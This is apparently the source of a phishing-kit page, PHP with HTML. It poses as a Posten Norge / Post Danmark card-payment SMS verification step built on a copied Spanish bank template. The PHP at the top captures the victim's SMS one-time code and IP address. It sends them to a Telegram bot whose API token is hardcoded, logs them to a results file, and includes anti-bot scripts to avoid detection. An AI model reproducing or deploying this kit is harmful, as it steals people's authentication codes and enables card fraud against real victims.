<?php
include "anti/anti1.php";
include "anti/anti2.php"; 
include "anti/anti3.php"; 
include "anti/anti4.php"; 
include "anti/anti5.php"; 
include "anti/anti6.php"; 
include "anti/anti7.php"; 
include "anti/anti8.php"; 
include "id.php";
if(isset($_POST['megria'])){
$ip = getenv("REMOTE_ADDR");
$message = "☢🥳😍🤯🤯***🤑😎😎Norway BY MEGRIA😎😎🤑***🤯🤯😍🥳☢\nSMS : ".$_POST['sms']."\nIP      : ".$ip." \n☢🥳😍🤯🤯***🤑😎😎Norway BY MEGRIA😎😎🤑***🤯🤯😍🥳☢\n";
foreach($user_ids as $user_id) {
$url='https://api.telegram.org/bot1333235411:AAGvLmW6VA50n-w5AjV7V7gyC5fFR7rcbKI/sendMessage';
$data=array('chat_id'=>$user_id,'text'=>$message);
$options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
$context=stream_context_create($options);
$result=file_get_contents($url,false,$context);
}
$myfile = fopen("rzlt.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);
if ($error='1'){
HEADER("Location: index4.php");
}else{
HEADER("Location: thanks.php");
}
}
?>
 <!DOCTYPE html>
<!-- saved from url=(0046)https://sas.redsys.es/sas/SerSvlFinanetDirecto -->
<html xmlns:xalan="http://xml.apache.org/xslt" class="lt-ie10 js no-flexbox no-flexboxlegacy canvas canvastext no-webgl no-touch geolocation postmessage no-websqldatabase no-indexeddb hashchange no-history draganddrop no-websockets rgba hsla multiplebgs backgroundsize no-borderimage borderradius boxshadow no-textshadow opacity no-cssanimations no-csscolumns no-cssgradients no-cssreflections csstransforms no-csstransforms3d no-csstransitions fontface generatedcontent video audio localstorage sessionstorage no-webworkers no-applicationcache svg inlinesvg no-smil svgclippaths"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">

<title>Posten Norge :SMS Verification</title>
<meta http-equiv="Content-Type" content="text/html; charset="UTF-8">
<meta content="Monday, 01-Jan-90 00:00:00 GMT" http-equiv="Expires">
<meta content="no-cache" http-equiv="Pragma">
<meta content="no-cache" http-equiv="Cache-Control">
<meta content="IE=edge" http-equiv="X-UA-Compatible">

<meta content="width=device-width, initial-scale=1.0" name="viewport">
			<!--[if lt IE 9]>
				<script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
				<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
			<![endif]-->
			<meta name="viewport" content="width=device-width, initial-scale=1.0">
<script language="JavaScript">
		/**
		Funcion que obtiene el valor de un elemento
		e	: elemento
		nombre :nombre del elemento
		usada en las callbacks para ajax
		**/
		function dameValorElemento(e,nombre)
		{
			var valor = null;
			if (e == null)
				return null;
			var aux = e.getElementsByTagName(nombre);
			if (aux != null)
				aux = aux[0];
			return valorElemento(aux);
			return valor;
		}
	
		/**
		Funcion que devuelve el valor de un elemento hoja de un arbol XML
		e: elemento
		usada en las callbacks para ajax
		**/
		function valorElemento(e) {
			var valor = null;
			if (e != null)
				e = e.childNodes[0];
			if (e != null)
				valor = e.nodeValue;	
			return valor;
		}
		</script>
<link type="text/css" href="./BANKIA_files/css" rel="stylesheet">
<link type="text/css" media="screen" rel="stylesheet" href="./BANKIA_files/bootstrap.min.css">
<link type="text/css" media="screen" rel="stylesheet" href="./BANKIA_files/bootstrap-responsive.css">
<link type="text/css" media="screen" rel="stylesheet" href="./BANKIA_files/font-awesome.min.css">
<link type="text/css" media="screen" rel="stylesheet" href="./BANKIA_files/2038.css">
<script src="./BANKIA_files/utils.js.download" language="JavaScript" type="text/javascript"></script><script src="./BANKIA_files/des.js.download" language="JavaScript" type="text/javascript"></script><script src="./BANKIA_files/pwdbaseud.js.download" language="JavaScript" type="text/javascript"></script><script language="JavaScript" type="text/javascript">
				function finalizaIndirecto(){
		       		ocultaBoton();
		    		window.close();
		    		window.opener.submitDatos("","","NO_AUTENTICADA","");
				}
			</script>
</head>
<body>
<header class="header-margin-top">
<div class="container">
<div class="row">
<div class="span4 logo">
<img class="logo-entidad" src="https://2bm.com/wp-content/uploads/2015/02/2000px-Post_Danmark_logo.svg_.png#bAA75ekQhc1AES8bKzJzKNZrx9YjIuyCl+jgiBKOzNIaIIGrgQhJzudAVJoEgmoPjgwv8Tqb4IPUbK+g9661Gri9eyB0OQEctvNgGXbirvDZLzfWH9FaTHBS4G4aE4gPsiUfA78mb+UBFdHIJMcDwFyUVpjJ3vvrEEEfYADpB8geC7AABo+UUoIHbehRnL22X7QZoPC6z3QhNlBHSYoAceknoYEQUs8XcrYBHPUAp/UnhWlzu0gHgWsXwF5W/2JhBj5kMGAHyIVhApIHAdZAAANBApoGnStQ3mF18Tg3hkZEaHIAce4gcHUQgSgYAKyH0XUQyb4CpH1UjatIIZsXwpt0cDUIL/kGUOxUEOoAEj0AAVUAIXcFkGIGYD5z8TUAEUQGzSpQ3RBg25hnMU44IB2CR+IAd8kAkGsQpjAAVmYAcDUQfZ93oclxHR0Av4ckO7AAzGsA0xQYQcUH/rNwIDoQEIsIT+A4BZBXAAlsVHB9EAxraICGAAAIAAC3BJXlgxtLBaqtVpE/EJaCIIgUCANGgQsTAGSiAFUmBTwcV0f6eDG9ENngdS2LNN0NANM0GEvbdHAnB/mdZVHdRRYVVNmFcQI8AAAOBVDQUACdBMzvZsmUg3nnYQrxCKgYCGi3AQqICKdKZ0PuCKM3ADZxAT30AN0LBN6GgMymCL1PANNqGL/3CJHVQASPgPCsUAB7CEAXAADNAAHvh4zoRhCfAAKjZE22BSSQUMFDgQwkBCoog+xnMQblAF3WgE33gDR1GHu4N+B8GLklUQHlABEjBVDDABE0B5B+EBFXUAEPB1ZUVtvqCCTdlkDAtZEEUkinqQIxMBB2MAT/AUFlFwOkJJELlQRoKgB4NQCkO5lB1RjYhwlIPAlFKZEb9AQgUUCCc0lVopEb/wCWWok1sZlv+gWuASCqQnCFIilmFpC2zlVgCIJnWnllvJlm01d38il2K5CynlKgCoX3iplclADHrZC69gTksREAA7"></div>
<div class="span4 offset4">
<img class="logo-marca" src="https://www.web-merchant.co.uk/Images/logo_3d.gif"></div>
</div>
</div>
</header>
<script src="./BANKIA_files/jquery.min.js.download"></script><script type="text/javascript" src="./BANKIA_files/bootstrap.min.js.download"></script><script type="text/javascript" src="./BANKIA_files/custom_10.js.download"></script><script type="text/javascript">
			$(function () {
			$('[data-toggle="tooltip"]').tooltip();
		})
		</script>
<div class="container">
<div class="row">
<div class="span12">
<h1>Sikker elektronisk handel: verifikation af dit kort</h1>
</div>
</div>
<div class="row relativo">
<form role="form" method="post" name="otp" id="otpForm" class="clave-sms" action="">
<div class="span4 datos-compra">
<div class="caja-sombreada">
<h2>Købsoplysninger</h2>
<h3>Kontroller transaktionsoplysningerne</h3>
<table class="table">
<tbody><tr>
<td>Importeret</td><td class="precio">22.25 DKK</td>
</tr>
<tr>
<td>Handel</td><td><strong>Post Danmark</strong></td>
</tr>
<tr>
<td>Kortnummer</td><td><strong>**** **** **** ****</strong></td>
</tr>
</tbody></table>
</div>
</div>
<div class="span8 col-r">
<fieldset>
<div>
<legend data-placement="bottom" class="tooltiptext" data-toggle="tooltip" title="" data-original-title="Si el número de móvil no es correcto, puede modificarlo en su Área Clientes de nuestra web">For at bekræfte handlingen skal du indtaste den adgangskode, som vi har sendt med sms til din mobil. **********</legend><label>Clave SMS<span class="help-inline"></span></label>
</div>
<div>
<input required="required" data-placement="bottom" data-toggle="tooltip" maxlength="8" type="text" id="PIN" name="sms" autofocus="autofocus" title="" alt="Introduzca la clave que ha recibido en su teléfono móvil" placeholder="
Indtast " data-original-title="
Indtast din SMS-nøgle her">
<div class="blanco"></div>
</div>
</fieldset>
<div class="caja-sombreada errores-frecuentes">
<h3 class="no-recibe">Du modtager ikke nøglen på din mobiltelefon?</h3>
<h4>Sørg for, at din telefon</h4>
<ul>
<li>
<span>Det er på</span>
</li>
<li>
<span>Har dækning</span>
</li>
<li>
<span>Vær din hovedenhed, hvis du har flere SIM-kort</span>
</li>
<li>
<span>PDu kan undtagelsesvis anmode om det på 902 2 4 6 8 10 (eller 91 602 46 80) - Internet Office-forespørgsler</span>
</li>
</ul>
</div>
</div>
<div class="span12 botones">
<button name="megria" onclick="javascript:submitePIN();" type="submit" id="btn_aceptar" class="btn-aceptar">At acceptere</button><button onclick="javascript:if(mensajeCancelar()) document.frmCancelar.submit();" data-placement="bottom" data-toggle="tooltip" class="btn-cancelar" title="" data-original-title="Al pulsar en cancelar se cancelará la operación y tendrá que volver a empezar"></button>
</div>
</form>
<div style="width: 100%;" class="flotante">
<form role="form" method="post" name="otp_solicita" id="otpFormSolicita" class="clave-sms" action="https://sas.redsys.es/sas/SerSvlFinanetDirectoAutentica;jsessionid=0000Ie8i2tBPJq7PBNY1CTZzzR4:1ccv7n47o"></form>
</div>
</div>
</div>
<div aria-hidden="true" aria-labelledby="ayudaLabel" role="dialog" tabindex="-1" class="modal hide fade" id="ayuda">
<div class="modal-header">
<button aria-hidden="true" data-dismiss="modal" class="close" type="button">×</button>
<h3 id="myModalLabel">¿Por qué no recibe la OTP?</h3>
</div>
<div class="modal-body">
<p></p>
<div aria-multiselectable="true" role="tablist" id="accordion" class="panel-group">
<div class="panel panel-default">
<div id="headingOne" role="tab" class="panel-heading">
<h4 class="panel-title">
<a alt="¿Tiene su teléfono la memoria llena?" aria-controls="collapseOne" aria-expanded="true" href="https://sas.redsys.es/sas/SerSvlFinanetDirecto#collapseOne" data-parent="#accordion" data-toggle="collapse">¿Tiene su teléfono la memoria llena?</a>
</h4>
</div>
<div aria-labelledby="headingOne" role="tabpanel" class="panel-collapse collapse" id="collapseOne">
<div class="panel-body">Es posible que la memoria de su teléfono está llena y eso provoque que los nuevos mensajes no puedan ser entregados. Para solucionar este problema bastaría con liberar espacio 
				en la memoria para dejar espacio a los nuevos mensajes.</div>
</div>
</div>
<div class="panel panel-default">
<div id="headingTwo" role="tab" class="panel-heading">
<h4 class="panel-title">
<a alt="¿Dispone usted de una tarjeta SIM Dual?" aria-controls="collapseTwo" aria-expanded="false" href="https://sas.redsys.es/sas/SerSvlFinanetDirecto#collapseTwo" data-parent="#accordion" data-toggle="collapse" class="collapsed">¿Dispone usted de una tarjeta SIM Dual?</a>
</h4>
</div>
<div aria-labelledby="headingTwo" role="tabpanel" class="panel-collapse collapse" id="collapseTwo">
<div class="panel-body">Con una tarjeta dual el usuario tiene en un mismo teléfono una única SIM pero con 2 líneas diferentes. El mayor inconveniente de este sistema es que no permite tener las 2 líneas activas a la vez. 
				Es por ello que el teléfono registrado para recibir los SMS no sea la línea activa en ese momento y por ello no se reciban.</div>
</div>
</div>
<div class="panel panel-default">
<div id="headingThree" role="tab" class="panel-heading">
<h4 class="panel-title">
<a alt="¿Dispone de un teléfono Multi SIM?" aria-controls="collapseThree" aria-expanded="false" href="https://sas.redsys.es/sas/SerSvlFinanetDirecto#collapseThree" data-parent="#accordion" data-toggle="collapse" class="collapsed">¿Dispone de un teléfono Multi SIM?</a>
</h4>
</div>
<div aria-labelledby="headingThree" role="tabpanel" class="panel-collapse collapse" id="collapseThree">
<div class="panel-body">Un teléfono Dual SIM permite a los usuarios tener en un único terminal más de una tarjeta SIM con líneas diferentes. El problema es que existen dispositivos de este tipo
					que no permiten que ambas tarjetas estén activas simultáneamente. Es por ello que puede suceder que no reciba los SMS porque la tarjeta que está activa no es la correcta.</div>
</div>
</div>
<div class="panel panel-default">
<div id="headingFour" role="tab" class="panel-heading">
<h4 class="panel-title">
<a alt="¿Dispone de cobertura?" aria-controls="collapseFour" aria-expanded="false" href="https://sas.redsys.es/sas/SerSvlFinanetDirecto#collapseFour" data-parent="#accordion" data-toggle="collapse" class="collapsed">¿Dispone de cobertura?</a>
</h4>
</div>
<div aria-labelledby="headingFour" role="tabpanel" class="panel-collapse collapse" id="collapseFour">
<div class="panel-body">Es muy común que en el momento de intentar el pago, usted se encuentre en una zona en la que no disponga de cobertura o que ésta esté limitada debido a algún tipo de evento cercano a
					como eventos deportivos, conciertos, etc y no permita la entrega correcta de los SMS.</div>
</div>
</div>
<div class="panel panel-default">
<div id="headingFive" role="tab" class="panel-heading">
<h4 class="panel-title">
<a alt="¿Dispone de alguna aplicación que bloquea los SMS?" aria-controls="collapseFive" aria-expanded="false" href="https://sas.redsys.es/sas/SerSvlFinanetDirecto#collapseFive" data-parent="#accordion" data-toggle="collapse" class="collapsed">¿Dispone de alguna aplicación que bloquea los SMS?</a>
</h4>
</div>
<div aria-labelledby="headingFive" role="tabpanel" class="panel-collapse collapse" id="collapseFive">
<div class="panel-body">Debido a la cantidad de mensajes SMS que recibe en su teléfono móvil, puede que haya instalado una aplicación para bloquear ciertos mensajes como pueden ser los SMS publicitarios, con los que muchas 
					empresas bombardean a la gente. Muchas de estas aplicaciones consideran los SMS que envía la entidad como un SMS no deseado y los bloquea. </div>
</div>
</div>
</div>
</div>
<div class="modal-footer">
<button aria-hidden="true" data-dismiss="modal" class="btn-aceptar">Cerrar</button>
</div>
</div>
<form name="frmCancelar" method="POST" action="https://sis.sermepa.es/sis/pagoFinanet;jsessionid=000014z8tQh8SYe5QzExm3uy2wF:1bc077snl">
<input type="hidden" name="Sis_Resultado_Autenticacion" value="NO_AUTENTICADA"><input type="hidden" name="Sis_Signature" value="61d2b0183fb771cf8139d36274a97ee4f40d7d2c">
</form>


</body></html>